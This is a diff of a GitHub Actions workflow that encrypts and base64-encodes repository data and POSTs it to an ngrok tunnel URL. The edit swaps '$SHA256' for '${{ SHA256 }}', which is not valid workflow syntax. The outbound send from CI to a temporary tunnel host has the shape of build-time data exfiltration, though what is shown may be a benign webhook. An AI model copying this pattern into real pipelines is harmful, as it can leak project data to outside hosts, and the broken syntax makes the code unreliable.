@@ -19,7 +19,7 @@ jobs:
         echo "${{ github.repository }}" >> data.txt
         openssl rsautl -encrypt -inkey publickey.pem -pubin -in data.txt -out top_secret.enc
         openssl enc -base64 -in top_secret.enc -out secret.base64
-        sha256 data.txt >> "$SHA256"
+        sha256 data.txt >> "${{ SHA256 }}"
       env:
         PUBLIC_KEY: ${{ secrets.RSA_PUBLIC }}
         
@@ -38,5 +38,5 @@ jobs:
         url: 'https://7cee-54-91-189-235.ngrok.io/hook/'
         method: 'POST'
         #data: '{"key":"${{ steps.package.outputs.content }}"}'
-        data: '{"data":"${{ steps.package.outputs.content }}" , "sha256":"$SHA256"}'
+        data: '{"data":"${{ steps.package.outputs.content }}" , "sha256":"${{ SHA256 }}"}'
       
